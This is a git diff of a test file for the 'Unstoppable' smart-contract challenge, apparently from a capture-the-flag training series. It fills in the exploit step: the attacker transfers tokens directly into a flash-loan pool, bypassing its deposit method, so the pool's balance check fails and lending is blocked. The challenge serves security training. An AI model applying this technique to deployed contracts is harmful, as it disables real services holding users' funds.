@@ -19,9 +19,11 @@ describe('[Challenge] Unstoppable', function () {
         this.token = await DamnValuableTokenFactory.deploy();
         this.pool = await UnstoppableLenderFactory.deploy(this.token.address);
 
+        // Init pool balance
         await this.token.approve(this.pool.address, TOKENS_IN_POOL);
         await this.pool.depositTokens(TOKENS_IN_POOL);
 
+        // Init token balance
         await this.token.transfer(attacker.address, INITIAL_ATTACKER_TOKEN_BALANCE);
 
         expect(
@@ -36,10 +38,15 @@ describe('[Challenge] Unstoppable', function () {
          const ReceiverContractFactory = await ethers.getContractFactory('ReceiverUnstoppable', someUser);
          this.receiverContract = await ReceiverContractFactory.deploy(this.pool.address);
          await this.receiverContract.executeFlashLoan(10);
+        expect(await this.token.balanceOf(this.pool.address)).to.equal(TOKENS_IN_POOL);
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        // Transfer tokens into the pool by bypassing the depositTokens method
+        await this.token.connect(attacker).transfer(this.pool.address, INITIAL_ATTACKER_TOKEN_BALANCE);
+        // The `assert(poolBalance == balanceBefore)` statement should then fail
+        expect(await this.token.balanceOf(this.pool.address)).to.be.gt(TOKENS_IN_POOL);
+        expect(await this.pool.poolBalance()).to.equal(TOKENS_IN_POOL);
     });
 
     after(async function () {
